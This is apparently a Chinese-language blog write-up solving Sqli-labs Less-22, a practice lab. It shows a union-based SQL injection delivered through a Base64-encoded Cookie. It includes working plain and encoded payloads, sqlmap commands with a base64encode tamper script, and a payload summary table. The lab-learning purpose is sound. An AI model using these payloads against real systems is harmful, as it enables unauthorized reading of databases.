---
title: Sqli-labs Less-22 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, Cookie注入, Base64编码, 联合查询]
---

## 一、 漏洞概述
- **关卡**：Less-22
- **漏洞类型**：基于 Base64 编码的 Cookie 联合查询注入（Base64 Encoded Cookie SQL Injection）
- **注入点**：HTTP 请求头中的 `Cookie`（`uname` 字段）
- **闭合方式**：双引号 `"`
- **后端语句**：`SELECT * FROM users WHERE username=("$decoded_uname") LIMIT 0,1;`

## 二、 渗透测试过程

### 1. 探测注入点与编码方式
登录（如 `admin` / `admin`）成功后，使用 Burp Suite 拦截请求。观察到 Cookie 头部内容为：
`Cookie: uname=YWRtaW4%3D`
其中 `YWRtaW4%3D` 是 `admin` 的 Base64 编码（`YWRtaW4=`）经过 URL 编码后的结果。这说明后端代码对 Cookie 进行了 Base64 解码再拼接。

### 2. 测试闭合方式
与 Less-21 不同，这里使用单引号测试可能会失败。我们需要测试双引号。
构造 payload：`admin"`
Base64 编码后：`YWRtaW4i`
修改 Cookie 发送：
```http
Cookie: uname=YWRtaW4i
```

页面返回 SQL 语法报错。由此确认后端闭合方式为双引号 "。

### 3. 确定字段数量

构造 payload：admin" order by 3 #
Base64 编码后：YWRtaW4iIG9yZGVyIGJ5IDMgIw==
修改 Cookie 发送，页面正常；将 3 改为 4 测试，页面报错。确认字段数为 3。

### 4. 联合查询获取数据

使用 UNION SELECT 获取回显。使用一个不存在的用户名（如 -admin）让前置查询为空。
构造 payload：-admin" union select 1,database(),3 #
Base64 编码后：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMgIw==

修改 Cookie 发送：

```http
Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMgIw==
```

页面成功回显数据库名 security。

## 三、 自动化利用 (SQLMap)

针对 Base64 编码的 Cookie 注入，依然推荐使用 -r 读取请求文件，或结合 --tamper 脚本。

```bash
# 方法一：读取包含拦截请求的文本文件
sqlmap -r less22.txt --batch --current-db

# 方法二：使用 tamper 脚本自动进行 Base64 编码
sqlmap -u "http://localhost/sqli-labs-master/Less-22/" --cookie="uname=admin*" --tamper=base64encode.py --batch --current-db
```

## 四、 通关 Payload 汇总 (需 Base64 编码)

测试目的 明文 Payload Base64 编码后的值 (用于 Cookie)
测试闭合 admin" YWRtaW4i
判断字段数 admin" order by 3 # YWRtaW4iIG9yZGVyIGJ5IDMgIw==
获取库名 -admin" union select 1,database(),3 # LWFkbWluIiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMgIw==
获取表名 -admin" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' # (需自行使用工具编码)
